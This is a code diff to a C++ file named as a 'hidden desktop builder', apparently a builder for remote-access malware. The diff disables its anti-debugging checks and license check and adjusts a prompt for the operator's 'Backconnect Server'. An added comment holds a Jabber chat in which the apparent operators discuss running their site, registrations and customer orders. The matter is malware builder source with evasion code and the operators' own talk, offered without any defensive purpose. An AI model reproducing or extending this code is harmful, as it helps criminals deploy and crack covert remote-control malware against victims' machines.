@@ -1,5 +1,30 @@
 // dark_hiddenDesktopBuilder.cpp : Diese Datei enthält die Funktion "main". Hier beginnt und endet die Ausführung des Programms.
 //
+
+
+/*
+
+(18:24:44) somekinkysexgoingon@jabber.cz: No, i just came back after 2 days
+(18:25:03) somekinkysexgoingon@jabber.cz: Very nice will test today with worldmix
+(18:25:08) somekinkysexgoingon@jabber.cz: but also as you see
+(18:25:26) somekinkysexgoingon@jabber.cz: someone run scanner on site
+(18:25:38) somekinkysexgoingon@jabber.cz: so alot of fake users has been created, protentially they can fill the network
+(18:26:00) somekinkysexgoingon@jabber.cz: it can be solved simply, rate limit a IP to 1 registration per hour
+(18:26:11) somekinkysexgoingon@jabber.cz: Add a captcha
+(18:26:21) somekinkysexgoingon@jabber.cz: Change minimum. username to 5 characters
+(18:26:38) somekinkysexgoingon@jabber.cz: add CSRF to avoid forgery
+(18:27:02) somekinkysexgoingon@jabber.cz: (CSRF and Captcha are top solution with rate limit)
+(18:27:16) somekinkysexgoingon@jabber.cz: then we will avoid these junk users to be accepted as registrations
+(18:27:24) DarkSpider: haah nice yea should be easy
+(18:27:42) somekinkysexgoingon@jabber.cz: It is easy
+(18:27:45) somekinkysexgoingon@jabber.cz: Just encrypt IPs
+(18:28:21) somekinkysexgoingon@jabber.cz: Because their will always be a retard who signup without VPN and gets rate limited cause of retarded actions
+(18:29:08) somekinkysexgoingon@jabber.cz: My partner asked you to change a order to EU ?
+(18:29:39) somekinkysexgoingon@jabber.cz: Also for tickets - You should require a title and a message
+(18:29:58) somekinkysexgoingon@jabber.cz: and a minimum character for title and message so we dont get these empty tickets from people who play hackers
+
+*/
+
 #include <Windows.h>
 #include <iostream>
 #include <sstream>
@@ -56,17 +81,18 @@ int main()
 	adbg_IsDebuggerPresent();
 	adbg_IsDebuggerPresent();
 	adbg_CheckRemoteDebuggerPresent();
+	/*
 	adbg_BeingDebuggedPEB();
 	adbg_NtGlobalFlagPEB();
 	adbg_HardwareDebugRegisters();
 	adbg_RDTSC();
 	adbg_QueryPerformanceCounter();
 	adbg_GetTickCount();
-
+	*/
 	std::string user;
 	std::string license = readFile();
 	if (license == "false") {
-		return 0;
+		//return 0;
 	}
 
 	std::cout << "Username:"; std::cin >> user;
@@ -131,7 +157,7 @@ std::cout << R"(
 
 
 			std::string write;
-			std::cout << "Enter your Backconnect Server: (127.0.0.1)\n";
+			std::cout << "Enter your Backconnect Server: (127.0.0.1): ";
 			std::cin >> write;
 
 			std::cout << write << std::endl;
